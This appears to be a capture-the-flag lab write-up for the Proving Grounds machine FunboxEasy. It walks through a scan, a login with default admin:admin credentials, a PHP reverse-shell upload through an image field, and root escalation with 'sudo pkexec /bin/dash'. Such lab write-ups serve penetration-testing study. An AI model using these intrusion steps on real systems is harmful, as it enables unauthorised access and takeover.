---
title: "Proving grounds Play: FunboxEasy"
layout: post
date: 2023-09-16 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2d8516ec584051908ebc8582713132f (RSA)
|   256 b0de9703a72ff4e2ab4a9cd9439b8a48 (ECDSA)
|_  256 9d0f9a26384f0180a7a6809dd1d4cfec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

## Web PORT: 80

### Directory Fuzzing

![img](/assets/images/CTF/Proving_Grounds/FunboxEasy/web.png)

http://192.168.169.111/store/

## Admin Login

http://192.168.169.111/store/admin.php

Use credentials `admin:admin` for the admin login.

## Upload Reverse Shell

Click Add new book and upload php reverse shell on the image section and post the book.

Direct to the books page to trigger reverse shell.

![img](/assets/images/CTF/Proving_Grounds/FunboxEasy/shell.png)

A file named `password.txt` located in the user `tony` folder has password of SSH login.

## Privilege Esclation

Login to user tony via SSH using the credentials and run `sudo -l` to check the permissions.

```sh
tony@funbox3:~$ sudo -l
User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

**GTFO Bins Exploit**

![img](/assets/images/CTF/Proving_Grounds/FunboxEasy/gtfo.png)

Alternatively the root privilege can be elevated via the `pkexec` binary as well.

```sh
sudo pkexec /bin/dash
```

**Root Obtained**

![img](/assets/images/CTF/Proving_Grounds/FunboxEasy/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).